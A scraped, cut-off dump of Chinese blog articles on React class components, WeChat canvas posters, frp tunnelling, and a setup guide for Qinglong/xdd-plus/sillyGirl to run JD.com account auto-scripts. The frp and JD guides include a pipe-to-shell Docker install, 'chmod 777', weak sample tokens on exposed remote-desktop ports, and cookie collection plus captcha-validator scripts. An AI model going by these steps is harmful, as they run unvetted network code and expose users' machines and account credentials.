&lt;button onClick=&#123;(e)=&gt;this.handleClick(e)&#125;&gt;按钮&lt;/button&gt; &lt;/div&gt; &lt;/&gt; ); &#125;&#125;export default App; 2.通过 bind 解决 this 问题123456789101112131415161718192021222324import &#123; Component &#125; from \"react\"; class App extends Component &#123; // 状态 state = &#123; count: 0, &#125;; // 事件处理函数 handleClick(e) &#123; console.log(e) console.log(this.state.count) &#125; render() &#123; return ( &lt;&gt; &lt;div&gt;计数器：&#123;this.state.count&#125;&lt;/div&gt; &lt;div&gt;+ &lt;button onClick=&#123;this.handleClick.bind(this)&#125;&gt;按钮&lt;/button&gt; &lt;/div&gt; &lt;/&gt; ); &#125;&#125;export default App; 3.通过声明箭头函数解决 this 问题(推荐)利用箭头函数形式的class实例方法。 注意：该语法是实验性语法，但是，由于babel的存在可以直接使用。 123456789101112131415161718192021222324import &#123; Component &#125; from \"react\"; class App extends Component &#123; // 状态 state = &#123; count: 0, &#125;; // 事件处理函数+ handleClick = (e) =&gt; &#123; console.log(e) console.log(this.state.count) &#125; render() &#123; return ( &lt;&gt; &lt;div&gt;计数器：&#123;this.state.count&#125;&lt;/div&gt; &lt;div&gt; &lt;button onClick=&#123;this.handleClick&#125;&gt;按钮&lt;/button&gt; &lt;/div&gt; &lt;/&gt; ); &#125;&#125;export default App; 类组件 - setState 使用 React 类组件提供一个函数setState({需修改数据})，可以更新数据和视图。 直接修改 state 中的数据是不会更新视图，演示简单数据，数组，对象的正确修改方式。 1.通过setState的来修改数据更新视图12345678910111213141516171819202122232425import &#123; Component &#125; from 'react'; class App extends Component &#123; state = &#123; count: 0, &#125;; handleClick = () =&gt; &#123; // 修改数据 this.setState(&#123; // key是要修改的数据名称，value是对应的新值 count: this.state.count + 1, &#125;); &#125;; render() &#123; return ( &lt;&gt; &lt;div&gt;计数器：&#123;this.state.count&#125;&lt;/div&gt; &lt;div&gt; &lt;button onClick=&#123;this.handleClick&#125;&gt;按钮&lt;/button&gt; &lt;/div&gt; &lt;/&gt; ); &#125;&#125;export default App; 2.修改数组和修改对象的正确姿势1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import &#123; Component &#125; from 'react'; class App extends Component &#123; state = &#123; count: 0, user: &#123; name: 'jack', age: 18, &#125;, list: ['电脑', '手机'], &#125;; handleClick = () =&gt; &#123; // 修改数据 this.setState(&#123; // key是要修改的数据名称，value是对应的新值 count: this.state.count + 1, &#125;); &#125;; updateList = () =&gt; &#123; // 修改列表 this.setState(&#123; list: [...this.state.list, '相机'], &#125;); &#125;; updateUser = () =&gt; &#123; // 修改对象 this.setState(&#123; user: &#123; ...this.state.user, name: 'tony', &#125;, &#125;); &#125;; render() &#123; return ( &lt;&gt; &lt;div&gt;计数器：&#123;this.state.count&#125;&lt;/div&gt; &lt;div&gt; &lt;button onClick=&#123;this.handleClick&#125;&gt;按钮&lt;/button&gt; &lt;/div&gt; &lt;hr /&gt; &lt;div&gt;商品：&#123;this.state.list.join(',')&#125;&lt;/div&gt; &lt;button onClick=&#123;this.updateList&#125;&gt;改数组&lt;/button&gt; &lt;hr /&gt; &lt;div&gt; 姓名：&#123;this.state.user.name&#125;，年龄：&#123;this.state.user.age&#125; &lt;/div&gt; &lt;button onClick=&#123;this.updateUser&#125;&gt;改对象&lt;/button&gt; &lt;/&gt; ); &#125;&#125;export default App; 类组件 - 受控组件1.什么是受控组件 表单元素的值被 React 中state控制，这个表单元素就是受控组件。 2.如何绑定表单元素，如：input:text input:checkbox 1234567891011121314151617181920212223242526272829303132333435363738394041424344import &#123; Component &#125; from 'react'; class App extends Component &#123; state = &#123; mobile: '13811112222', isAgree: true, &#125;; changeMobile = (e) =&gt; &#123; this.setState(&#123; mobile: e.target.value, &#125;); &#125;; changeAgree = (e) =&gt; &#123; this.setState(&#123; isAgree: e.target.checked, &#125;); &#125;; render() &#123; return ( &lt;&gt; &lt;div&gt; &lt;input value=&#123;this.state.mobile&#125; onChange=&#123;this.changeMobile&#125; type=\"text\" placeholder=\"请输入手机号\" /&gt; &lt;/div&gt; &lt;div&gt; &lt;input checked=&#123;this.state.isAgree&#125; onChange=&#123;this.changeAgree&#125; type=\"checkbox\" /&gt; 同意用户协议和隐私条款 &lt;/div&gt; &lt;/&gt; ); &#125;&#125;export default App; 总结： 使用state的数据赋值给表单原生，通过onChange监听值改变修改 state 数据，完成表单元素的绑定。 这种表单元素称为受控组件。 类组件 - 非受控组件1.什么是非受控组件？ 没有通过 state 控制的表单元素，它自己控制自身的值，就是非受控组件 2.通过 ref 获取表单元素获取非受控组件的值 1234567891011121314151617181920212223242526import &#123; Component, createRef &#125; from 'react'; class App extends Component &#123; // 获取非受控组件的值 // 1. 通过createRef创建一个ref对象 // 2. 给元素绑定ref属性值为创建的ref对象 // 3. 通过ref对象的current获取元素，再获取它的值 mobileRef = createRef(); getMobile = () =&gt; &#123; console.log(this.mobileRef.current.value); &#125;; render() &#123; return ( &lt;&gt; &lt;div&gt; &#123;/* 没有被state控制的表单原生认为是非受控组件 */&#125; &lt;input ref=&#123;this.mobileRef&#125; type=\"text\" placeholder=\"请输入手机号\" /&gt; &lt;button onClick=&#123;this.getMobile&#125;&gt;获取&lt;/button&gt; &lt;/div&gt; &lt;/&gt; ); &#125;&#125;export default App; 总结： ref 的作用：获取DOM或组件 借助于ref，使用原生 DOM方式来获取表单元素值。 总结1．组件的两种创建方式:函数组件和类组件 2．无状态(函数)组件，负责静态结构展示 3．有状态(类）组件，负责更新UI，让页面动起来 4．绑定事件注意this指向问题 5．推荐使用受控组件来处理表单 6．完全利用JS语言的能力创建组件，这是 React的思想","categories":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}],"tags":[{"name":"React","slug":"React","permalink":"//www.shen.ee/tags/React/"},{"name":"React组件","slug":"React组件","permalink":"//www.shen.ee/tags/React组件/"},{"name":"React组件基础","slug":"React组件基础","permalink":"//www.shen.ee/tags/React组件基础/"},{"name":"React定义组件","slug":"React定义组件","permalink":"//www.shen.ee/tags/React定义组件/"}],"keywords":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}]},{"title":"小程序canvas生成海报图片压缩和失真问题解决","slug":"小程序canvas生成海报图片压缩和失真问题解决","date":"2022-04-13T02:38:39.000Z","updated":"2022-06-22T06:24:26.009Z","comments":true,"path":"article/57435.html","link":"","permalink":"//www.shen.ee/article/57435.html","excerpt":"","text":"微信小程序实现canvas按照原图等比例不失真绘制海报图，防止模糊 我这里的场景是收款二维码+收款背景图。 绘制二维码我这里绘制二维码使用的 wxapp-qrcode ，也可以使用weapp-qrcode，基本都一样，详细代码不过多累赘，这里主要说下适配不同屏幕大小的canvas。 12345678910111213141516171819onLoad: function (options) &#123; const size = this.setCanvasSize() // 动态设置画布大小 this.createQrCode('www.iyouhun.com', \"mycanvas\", size.w, size.h)&#125;,// 适配不同屏幕大小的canvassetCanvasSize: function () &#123; const size = &#123;&#125; try &#123; var res = wx.getSystemInfoSync() var scale = 750 / 686; // 不同屏幕下canvas的适配比例；设计稿是750宽，686是因为wxss样式文件中设置的canvas大小 var width = res.windowWidth / scale var height = width; // canvas画布为正方形 size.w = width size.h = height &#125; catch (e) &#123; console.log(\"获取设备信息失败\" + e) &#125; return size&#125;, 绘制背景图动态设置图片的高度和宽度在小程序布局中，如果图片不是固定高度和高度，但image设置的是固定的高度和宽度，这时候原始图片相对image设置的固定高度和宽度不是等比例大小，那么这张图片就会变形，变的不清晰。这时就可以使用下面的等比例缩放的方式缩放图片，让图片不变形。或者通过image的bindload方法动态的获取图片的高度和宽度，动态的设置图片的高度和宽度，是图片布局的高度和宽度和原始图片的高度和宽度相等。 图片等比例缩放工具 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354//Util.js class Util&#123; /*** * 按照显示图片的宽等比例缩放得到显示图片的高 * @params originalWidth 原始图片的宽 * @params originalHeight 原始图片的高 * @params imageWidth 显示图片的宽，如果不传就使用屏幕的宽 * 返回图片的宽高对象 ***/ static imageZoomHeightUtil(originalWidth,originalHeight,imageWidth)&#123; let imageSize = &#123;&#125;; if(imageWidth)&#123; imageSize.imageWidth = imageWidth; imageSize.imageHeight = (imageWidth * originalHeight) / originalWidth; &#125;else&#123;//如果没有传imageWidth,使用屏幕的宽 wx.getSystemInfo(&#123; success: function (res) &#123; imageWidth = res.windowWidth; imageSize.imageWidth = imageWidth; imageSize.imageHeight = (imageWidth * originalHeight) / originalWidth; &#125; &#125;); &#125; return imageSize; &#125; /*** * 按照显示图片的高等比例缩放得到显示图片的宽 * @params originalWidth 原始图片的宽 * @params originalHeight 原始图片的高 * @params imageHeight 显示图片的高，如果不传就使用屏幕的高 * 返回图片的宽高对象 ***/ static imageZoomWidthUtil(originalWidth,originalHeight,imageHeight)&#123; let imageSize = &#123;&#125;; if(imageHeight)&#123; imageSize.imageWidth = (imageHeight *originalWidth) / originalHeight; imageSize.imageHeight = imageHeight; &#125;else&#123;//如果没有传imageHeight,使用屏幕的高 wx.getSystemInfo(&#123; success: function (res) &#123; imageHeight = res.windowHeight; imageSize.imageWidth = (imageHeight *originalWidth) / originalHeight; imageSize.imageHeight = imageHeight; &#125; &#125;); &#125; return imageSize; &#125; &#125; export default Util; 工具库使用 1&lt;image bindload=&quot;imageLoad&quot; src=&quot;../test.png&quot;/&gt; 123456789101112131415import Util from '../common/Util' Page(&#123; data:&#123; imageWidth:0, imageHeight:0 &#125;, imageLoad: function (e) &#123; //获取图片的原始宽度和高度 let originalWidth = e.detail.width let originalHeight = e.detail.height let imageSize = Util.imageZoomWidthUtil(originalWidth,originalHeight,145) this.setData(&#123;imageWidth:imageSize.imageWidth,imageHeight:imageSize.imageHeight&#125;) &#125; &#125;) 绘制背景图用上面的方法动态设置图片宽高，解决失真问题 1234567891011121314151617181920212223import Util from '../../libs/Util'// 背景图let bgImg = new Promise(function (resolve) &#123; wx.getImageInfo(&#123; src: 'https://www.iyouhun.com/payment/payment_pic.jpg', success: function (res) &#123; that.setData(&#123; imgInfo: res &#125;) // 根据屏幕宽度得到图片高 const imageSize = Util.imageZoomHeightUtil(that.data.imgInfo.width, that.data.imgInfo.height) that.setData(&#123; canvasHeight: imageSize.imageHeight &#125;) resolve(res.path) &#125;, fail: function (err) &#123; console.log(err) wx.showToast(&#123; title: '网络错误请重试', icon: 'loading' &#125;) &#125; &#125;)&#125;) 合成海报/收款码这里使用Promise分别去绘制二维码和背景图。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455// 收款码let qrcodeImg = new Promise(function (resolve) &#123; // ...&#125;)// 背景图let bgImg = new Promise(function (resolve) &#123; // ...&#125;Promise.all([bgImg, qrcodeImg]).then(function(result) &#123; wx.showLoading(&#123;title: '加载中'&#125;) // canvas绘制文字和图片，创建画图 const ctx = wx.createCanvasContext('myCanvas') // 绘制背景图 ctx.drawImage(result[0], 0, 0, that.data.imgInfo.width, that.data.imgInfo.height, 0, 0, that.data.canvasWidth, that.data.canvasHeight) ctx.setFillStyle('white') // 绘制二维码 二维码宽度300 const qrX = (that.data.canvasWidth - 300) / 2 // canvas宽度 - 二维码宽度 / 2 (居中) ctx.drawImage(result[1], qrX, 120, 300, 300) // 绘制文本 ctx.fillStyle = '#ffffff' // 背景 ctx.fillRect(Math.floor(qrX),420,300,20) ctx.fillStyle = \"#333333\" ctx.font = 25 + 'px Arial' // 文本大小, 字体 ctx.textAlign = 'center' ctx.fillText( 'No.'+ that.data.serialNum, that.data.canvasWidth / 2, // 左上角 X坐标 430, // 左上角 Y坐标 300 ) //canvasToTempFilePath必须要在draw的回调中执行，否则会生成失败，官方文档有说明 ctx.draw(false, setTimeout(function () &#123; wx.canvasToTempFilePath(&#123; canvasId: 'myCanvas', x: 0, y: 0, width: that.data.canvasWidth, height: that.data.canvasHeight, success: function (res) &#123; wx.hideLoading() that.setData(&#123; qrcodeStatus: true, shareImgSrc: res.tempFilePath &#125;) &#125;, fail: function (res) &#123; wx.hideLoading() wx.showToast(&#123; title: '生成失败', icon: \"none\" &#125;) &#125; &#125;) &#125;, 1000))&#125;) 效果图","categories":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}],"tags":[{"name":"小程序","slug":"小程序","permalink":"//www.shen.ee/tags/小程序/"},{"name":"微信小程序","slug":"微信小程序","permalink":"//www.shen.ee/tags/微信小程序/"},{"name":"canvas","slug":"canvas","permalink":"//www.shen.ee/tags/canvas/"},{"name":"canvas海报","slug":"canvas海报","permalink":"//www.shen.ee/tags/canvas海报/"},{"name":"小程序海报","slug":"小程序海报","permalink":"//www.shen.ee/tags/小程序海报/"}],"keywords":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}]},{"title":"一文搞懂frp内网穿透并搭建配置使用","slug":"一文搞懂frp内网穿透并搭建配置使用","date":"2021-12-17T02:38:39.000Z","updated":"2022-06-22T06:24:26.008Z","comments":true,"path":"article/3664.html","link":"","permalink":"//www.shen.ee/article/3664.html","excerpt":"","text":"实现内网穿需要有一台公网服务器、域名。（本文将公网服务器称为服务端，内网服务器称为客户端） frp 是什么frp 是一个专注于内网穿透的高性能的反向代理应用，支持 TCP、UDP、HTTP、HTTPS 等多种协议。可以将内网服务以安全、便捷的方式通过具有公网 IP 节点的中转暴露到公网。 有了内网穿透你能干什么？ 远程访问内网的 http/https 服务 远程桌面(Windows/Mac) 远程文件、 SSH 小程序开发 … 有了内网穿透在外访问家里的电脑、NAS、树莓派、摄像头等网络设备或远程控制，那都不是事儿~ 安装官方项目地址：https://github.com/fatedier/frp 以下命令请在服务器中执行 下载 1wget https://github.com/fatedier/frp/releases/download/v0.38.0/frp_0.38.0_linux_amd64.tar.gz 解压 1tar -xvf frp_0.38.0_linux_amd64.tar.gz 移动至/usr/local 12mkdir /usr/local/frpmv frp_0.38.0_linux_amd64/* /usr/local/frp/ 文件说明 frps.ini: 服务端配置文件frps: 服务端软件frpc.ini: 客户端配置文件frpc: 客户端软件 配置systemctl来控制，服务端运行vim新建文件并写入配置内容 1vim /usr/lib/systemd/system/frp.service 写入以下内容，注意上文移动放置的路径和此处有关。这里是启动的服务端。 12345678910111213141516[Unit]Description=The nginx HTTP and reverse proxy serverAfter=network.target remote-fs.target nss-lookup.target[Service]Type=simpleExecStart=/usr/local/frp/frps -c /usr/local/frp/frps.iniKillSignal=SIGQUITTimeoutStopSec=5KillMode=processPrivateTmp=trueStandardOutput=syslogStandardError=inherit[Install]WantedBy=multi-user.target 重新加载服务的配置文件 1systemctl daemon-reload 现在就可以用 systemctl 套装来控制 frp 了。 启动/停止/重启，查看状态，设置开机自启/关闭开机自启 123456systemctl start frpsystemctl stop frpsystemctl restart frpsystemctl status frpsystemctl enable frpsystemctl disable frp 配置和使用服务端frps.ini 12345678910111213[common] #必须设置bind_port = 7000 #是自己设定的frp服务端端口vhost_http_port = 80 #是自己设定的http访问端口token = 123 #核实身份用，加了更安全[ssh] #ssh反向代理(不是必须设置)listen_port = 6000 是自己设定的ssh访问端口[web] #http反向代理[]里的内容可以自己设定，但是客户端和服务端必须要对应(如[aaa],[bbb])；type = http #为服务类型，可以设为http,httpscustom_domains = test1.a.com #为要映射的域名，记得域名的A记录要解析到外网主机的IP。[web2] #同上(可设置多个) 示例 1234567891011121314[common]bind_port = 7000vhost_http_port = 80[ssh]listen_port = 6000[web]type = httpcustom_domains = test1.a.com[web2]type = httpcustom_domains = test2.a.com 启动 1234./frps -c ./frps.ini# 后台启动nohup ./frps -c ./frps.ini &amp; 客户端frpc.ini 123456789101112[common]server_addr = 远程frp服务器ipserver_port = 远程frp服务器端口token = 远程frp服务器token[http]type = httplocal_ip = 127.0.0.1local_port = 本地端口号remote_port = 远程frp服务器的http服务端口号custom_domains = 自定义配置的域名subdomain = 匹配服务端配置的subdomain_host 示例 123456789101112[common]server_addr = xx.xx.xx.xxserver_port = 7000token = 123[web] type = httpcustom_domains = xx.xx.xx.xxlocal_ip = 127.0.0.1local_port = 8080custom_domains = xxx.xxx.xxxsubdomain = k2p 启动 1234./frpc -c ./frpc.ini# 后台启动nohup ./frpc -c ./frpc.ini &amp; 访问内网http/https服务客户端配置123456789101112[common]server_addr = FRP服务端IPserver_port = 7000vhost_http_port = 80 #可自定义vhost_https_port = 443 #可自定义token= 123[web] type = httplocal_ip = 127.0.0.1local_port = 8080custom_domains = 自定义域名 运行服务后访问 custom_domains:vhost_http_port 示例：http://123.123.123.123 80可以省略 连接内网SSH客户端配置12345678910[common]server_addr = FRP服务端IPserver_port = 7000token= 123[ssh]type = tcplocal_ip = 127.0.0.1local_port = 22remote_port = 6000 运行服务后使用 ssh 工具直接连接即可12ssh 用户名@服务端ip -p 端口号# ssh youhun@x.x.x.x -p 6000 （将 x.x.x.x 替换成公网服务器 IP 地址） 远程连接Windows电脑(RDP)准备工作1.服务器放开端口 3389也可以自定义，我这里用 7001 2.开启windows电脑的允许远程连接 桌面 -&gt; 此电脑 -&gt; 图标右键 -&gt; 属性 -&gt; 远程设置 -&gt; 修改为允许远程连接到此计算机 Win10 以上系统直接设置中打开远程桌面即可 客户端配置12345678910[common]server_addr = FRP服务端IPserver_port = 7000token= 123[RDP]type = tcplocal_ip = 127.0.0.1local_port = 3389remote_port = 7001 新建 RDP 连接现在我们在外网任意一台电脑，搜索并打开windows远程桌面程序 输入 服务器IP:remote_port 例如：1.2.3.4:7001，就可以连接到内网的windows了。 在此过程中需要输入内网电脑的用户名和开机密码后才能进行远程操控。 设置开机自启windows 设置开机自启的方法有很多，这里推荐使用winsw将frp注册为系统服务。 参考链接：https://blog.csdn.net/atmosphere_/article/details/104018900 这个方法最稳定，这是我最终用的方法。 远程连接Mac电脑(VNC)准备工作1.服务器放开端口 5900 2.进入 Mac 的【系统偏好设置】-&gt;【共享】，勾选“屏幕共享”和“远程登录”，用户为“所有用户” 客户端配置123456789101112[common]server_addr = FRP服务端IPserver_port = 7000token = 123[vnc]type = tcplocal_ip = 127.0.0.1local_port = 5900remote_port = 5900use_encryption = trueuse_compression = true 新建 VNC 连接 连接成功后，输入 Mac 的用户名和密码就行 设置开机自启1.进入内网 Mac 系统，执行下列操作 123# 编辑自启动文件touch ~/Library/LaunchAgents/frpc.plistvim ~/Library/LaunchAgents/frpc.plist 2.frpc.plist 文件内容如下，注意文件中的 frpc 和 frpc.ini 路径，可以将这两个文件移到下方配置文件的路径下或者修改为你的路径 12345678910111213141516171819&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE plist PUBLIC -//Apple Computer//DTD PLIST 1.0//ENhttp://www.apple.com/DTDs/PropertyList-1.0.dtd &gt;&lt;plist version=\"1.0\"&gt;&lt;dict&gt; &lt;key&gt;Label&lt;/key&gt; &lt;string&gt;frpc&lt;/string&gt; &lt;key&gt;ProgramArguments&lt;/key&gt; &lt;array&gt; &lt;string&gt;/usr/local/bin/frpc/frpc&lt;/string&gt; &lt;string&gt;-c&lt;/string&gt; &lt;string&gt;/usr/local/bin/frpc/frpc.ini&lt;/string&gt; &lt;/array&gt; &lt;key&gt;KeepAlive&lt;/key&gt; &lt;true/&gt; &lt;key&gt;RunAtLoad&lt;/key&gt; &lt;true/&gt;&lt;/dict&gt;&lt;/plist&gt; 3.加载并生效 12sudo chown root ~/Library/LaunchAgents/frpc.plistsudo launchctl load -w ~/Library/LaunchAgents/frpc.plist 绑定域名取消端口访问http服务每次访问域名都需要加上端口很麻烦，可以设置 Nginx 转发 在客户端配置文件中设置域名，记得将域名解析到公网 IP 12345[web] type = httplocal_ip = 127.0.0.1local_port = 8080custom_domains = test.iyouhun.com; 然后设置 Nginx 转发 123456789101112131415...server &#123; listen 80; #监听http的80端口 server_name test.iyouhun.com; # 这是我们设置的域名 access_log logs/test.iyouhun.com.log main; # 记录日志 location / &#123; proxy_pass http://127.0.0.1:7001; # 转发到我们在frps.ini中设置的vhost_http_port端口 proxy_set_header Host $host:80; #不添加这行时访问需要 域名:7001才能访问到内网的机器，如果加了就不再需要后面的端口，直接使用域名访问 proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_hide_header X-Powered-By; &#125; &#125;... 配置泛域名(frp默认域名)域名解析 解析两条A记录：frp.xxx.com 和 *.frp.xxx.com，都指向你的云服务器ip，稍等一会，ping frp.xxx.com，如果能ping通说明解析成功 配置服务端 12345# frps.ini[common]bind_port = 7000...subdomain_host = frp.xxx.com 客户端使用 1234567# frpc.ini[web] type = httplocal_ip = 127.0.0.1local_port = 8080# 与frps中的subdomain_host连接起来就是 test.frp.xxx.comsubdomain = test #自定义域名前缀 访问域名：test.frp.xxx.com:vhost_http_port 注：如果 frps 配置了 subdomain_host，则 custom_domains 中不能是属于 subdomain_host 的子域名或者泛域名。 配置Nginx还是老样子，每次都加端口访问太麻烦了，因此使用 Nginx 做下转发 1234567891011server &#123; # 监听的80端口 listen 80; # 域名配置 记得一定要加上*.frp.xxx.com这个，只加frp.xxx.com是不行的 server_name * .frp.xxx.com frp.xxx.com; location / &#123; proxy_pass http: //127.0.0.1:8080; # 这个Host的header一定要加，不然转发后frp拿不到通过哪个域名访问的，导致转发失败 proxy_set_header Host $host; &#125;&#125; 相关问题启动不了服务端和客户端启动不了的情况下,并且没有报错误,有概率是因为文件没有执行权限 12# 赋值权限命令chomd 777 文件名 服务端启动报错 Exec format error1/frpc: cannot execute binary file: Exec format error 这是下载错文件了，下载的 FRP 与操作系统处理器架构不匹配，需要重新下载正确的文件。 可以使用 arch、uname -a 等命令查看系统架构。 12arch#x86_64 vue 项目出现Invalid Host header解决办法 // vue.config.js文件中增加disableHostCheck属性 12345module.exports = &#123; devServer: &#123; disableHostCheck: true &#125;&#125;","categories":[{"name":"工具","slug":"工具","permalink":"//www.shen.ee/categories/工具/"}],"tags":[{"name":"frp","slug":"frp","permalink":"//www.shen.ee/tags/frp/"},{"name":"内网穿透","slug":"内网穿透","permalink":"//www.shen.ee/tags/内网穿透/"},{"name":"frp搭建","slug":"frp搭建","permalink":"//www.shen.ee/tags/frp搭建/"},{"name":"内网穿透搭建","slug":"内网穿透搭建","permalink":"//www.shen.ee/tags/内网穿透搭建/"}],"keywords":[{"name":"工具","slug":"工具","permalink":"//www.shen.ee/categories/工具/"}]},{"title":"青龙面板&xdd-plus&傻妞sillyGirl&nvjdc保姆级安装系列教程","slug":"青龙面板&xdd-plus&傻妞sillyGirl&nvjdc保姆级安装系列教程","date":"2021-11-23T08:07:30.000Z","updated":"2022-06-22T06:24:26.011Z","comments":true,"path":"article/12570.html","link":"","permalink":"//www.shen.ee/article/12570.html","excerpt":"","text":"懒癌必备，京东代挂 直接上车链接 准备工作购买服务器腾讯云：2核4G8M带宽云服务器只需70元/年，198元/3年 阿里云：阿里云限时优惠1H2G1M 174元/3年 目前阿里云是限制越来越多，腾讯云是越来越便宜活动还多，强力推荐腾讯云！ 腾讯云不是新用户的可以看本站教程无限新用户：https://www.iyouhun.com/post-190.html 系统选择 CentOS或者Ubuntu 都行，我这里选择的 CentOS 7.6毕竟 8.0 官方已经不再维护了。 开放端口去服务器防火墙开放以下端口 5700 青龙面板 8080 XDD-Plus/傻妞 5701 nvjdc 上述端口你也可以自定义，但是后续使用则必须使用你指定的端口！ 开始搭建安装docke并设置开机启动12345sudo yum check-updatecurl -sSL https://get.daocloud.io/docker | shsudo systemctl start dockersudo systemctl status dockersudo systemctl enable docker 安装青龙面板拉取青龙面板1234567891011docker run -dit \\ --name ql \\ --hostname ql \\ --restart always \\ -p 5700:5700 \\ -v $PWD/ql/config:/ql/config \\ -v $PWD/ql/log:/ql/log \\ -v $PWD/ql/db:/ql/db \\ -v $PWD/ql/scripts:/ql/scripts \\ -v $PWD/ql/jbot:/ql/jbot \\ whyour/qinglong:latest 端口号可自定义 -p 5700:5700 端口号为5700 -p xxxx:5700 端口号为xxxx 注：改的端口号一定要在安全组中放行该端口，不然访问不到 登录青龙面板在浏览器中输入 服务器ip:端口号 端口号为上一步你自己设置的端口号 例如：123.123.123.123:5700 1.进入青龙面板的登陆页面，开始安装 2.选择通知方式 这里的通知方式是青龙面板登录通知等，不会或者没有就跳过 3.设置登录账号密码 4.安装完成，去登录 拉取定时任务脚本仓库这里推荐两个仓库 faker2仓库： 1ql repo https://ghproxy.com/https://github.com/shufflewzc/faker2.git \"jd_|jx_|gua_|jddj_|getJDCookie\" \"activity|backUp\" \"^jd[^_]|USER|ZooFaker_Necklace.js|JDJRValidator_Pure|sign_graphics_validate\" smiek2221仓库： 1ql repo https://ghproxy.com/github.com/smiek2221/scripts.git \"jd_|gua_\" \"\" \"ZooFaker_Necklace.js|JDJRValidator_Pure.js|sign_graphics_validate.js\" 1.在定时任务里 添加任务 2.添加完成后在列表里点击操作的运行先运行一次 青龙依赖安装更新后的青龙安装依赖更方便了，直接输入依赖名称在线安装 旧版的青龙需要使用命令 1234567891011docker exec -it QL bash -c \"npm install -g typescript\"docker exec -it QL bash -c \"npm install axios date-fns\"docker exec -it QL bash -c \"npm install crypto -g\"docker exec -it QL bash -c \"npm install jsdom\"docker exec -it QL bash -c \"npm install png-js\"docker exec -it QL bash -c \"npm install -g npm\"docker exec -it QL bash -c \"pnpm i png-js\"docker exec -it QL bash -c \"pip3 install requests\"docker exec -it QL bash -c \"apk add --no-cache build-base g++ cairo-dev pango-dev giflib-dev &amp;&amp; cd scripts &amp;&amp; npm install canvas --build-from-source\"docker exec -it QL bash -c \"apk add python3 zlib-dev gcc jpeg-dev python3-dev musl-dev freetype-dev\"docker exec -it QL bash -c \"cd /ql/scripts/ &amp;&amp; apk add --no-cache build-base g++ cairo-dev pango-dev giflib-dev &amp;&amp; npm i &amp;&amp; npm i -S ts-node typescript @types/node date-fns axios png-js canvas --build-from-source\" 依赖最好都安装上，防止很多脚本跑不了。 应用设置配置这里的应用其实就是为了对接xdd-plus、nvjdc 等应用。 1.添加应用，输入名称，勾选权限 2.添加成功后，可以在列表中查看Client ID和Client Secret后面会用到 搭建所需GO环境 xdd-plus 和 傻妞都需要 Go 环境 1.安装gcc 12yum -y install gccyum -y install gcc-c++ 2.下载go安装包 ，这里我们安装到usr/local目录 1cd /usr/local &amp;&amp; wget https://golang.google.cn/dl/go1.16.7.linux-amd64.tar.gz -O go1.16.7.linux-amd64.tar.gz 3.解压go安装包 1tar -xvzf go1.16.7.linux-amd64.tar.gz 4.配置环境变量,路径/etc/profile 12345export GO111MODULE=onexport GOPROXY=https://goproxy.cnexport GOROOT=/usr/local/goexport GOPATH=/usr/local/go/pathexport PATH=$PATH:$GOROOT/bin:$GOPATH/bin 复制上方代码添加到profile文件末尾 5.刷新环境变量 1source /etc/profile 6.检测一下看看有没有安装成功 1go env 如下图表示安装成功 安装xdd-plus1.拉取xdd-plus的库 1cd ~ &amp;&amp; git clone https://ghproxy.com/https://github.com/764763903a/xdd-plus.git 2.编译xdd 12cd xdd-plusgo build 3.给与xdd最高权限 1chmod 777 xdd 4.运行xdd（要确保你在xdd-plus目录下） 1./xdd 等程序跑个半分钟Ctrl+c退出 5.修改root/xdd-plus/conf/config.yaml文件 1234567891011121314151617181920212223242526272829303132333435363738mode: parallel #模式 balance(均衡模式)、parallel(平行模式)containers: - address: http://123.123.123.123:5700 #这里是你青龙面板的地址 username: 青龙面板的账号 #登陆青龙面板的账号 password: 青龙面板的密码 #登录青龙面板的密码 cid: Client ID #刚刚在青龙面板获取到的Client ID secret: Client Secret #刚刚在青龙面板获取到的Client Secret weigth: 1 #权重 balance模式下权重越高分得的ck越多，默认1 mode: parallel #模式 balance(均衡模式)、parallel(平行模式) limit: 9999 #限制容器ck数目AtTime: 8 #填写1-12之间的数 填错自负默认为10 10点容易出现高峰超时。IsHelp: true #填写true或者false falseIsOldV4: #填写true或者false false是否新版或者旧版V4Wskey: true # 填空默认禁用wskey转换 需要的填trueIsAddFriend: #填写true或者false falseLim: #填写1-N 代表限制次数Tyt: #填写1-N 代表推一推需要的互助值，默认为8Later: #延时防止黑IP自己设置 默认60 不怕黑的改为1即可 单位是秒ApiToken: #nvjdc短信接入token参数，自己设置theme: /root/xdd-plus/theme/admin.html #自定义主题，支持本地、网络路径 static: ./static #静态文件 便于自定义二维码页面时，引入css、js等文件master: #xdd-plus后台密码，并从井号开始把这一段文字全部删除database: /root/xdd-plus/.xdd.db qywx_key: #企业微信推送keydaily_push: #定时任务resident: #均衡模式下所有容器共同的账号pin，有多个用'&amp;'拼接。不建议填写。user_agent:telegram_bot_token:telegram_user_id:TGURL: #填写TG代理地址参考https://www.kejiwanjia.com/server/5221.html#3workerqquid: 管理员QQ #接收通知的qq号，管理员QQ号码qqgid: QQ群号 #监听的群qbot_public_mode: true #qq机器人群聊模式，默认私聊模式default_priority: #新用户默认优先级no_ghproxy: true #更新资源是否不使用代理daily_asset_push_cron: 0 21 * * * #日常资产推送时间 可以不填repos: - git: https://github.com/shufflewzc/faker2.git 修改完之后Ctrl+s保存文件退出，回到命令行在次运行上一步4 出现二维码，扫码绑定你的机器人qq，等一会后向你的机器人发消息测试。 ！！！注意xdd-plus默认端口 8080 6.然后Ctrl+c，为防止机器人被杀死我们后台挂机 1./xdd -d xdd-plus配置到此结束 安装傻妞sillyGirl1. 拉 “傻妞”库 由于傻妞现在默认路径在etc，所以教程内容也对应更新了路径 123cd /etc/ #cd到etc目录git clone https://ghproxy.com/https://github.com/cdle/sillyGirl.git #此时你的etc目录下会新增文件夹sillyGirlcd /etc/sillyGirl #cd到傻妞根目录 2. 新建dev.go 新建dev.go，用命令touch dev.go。或者直接用命令vi dev.go，键盘按字母i进入编辑。 输入下面的代码，按键盘Esc退出编辑，输入:wq保存并退出。 12345678910111213package mainimport (//青龙2.9机器人_ \"github.com/cdle/sillyGirl/develop/qinglong\" //京东账号_ 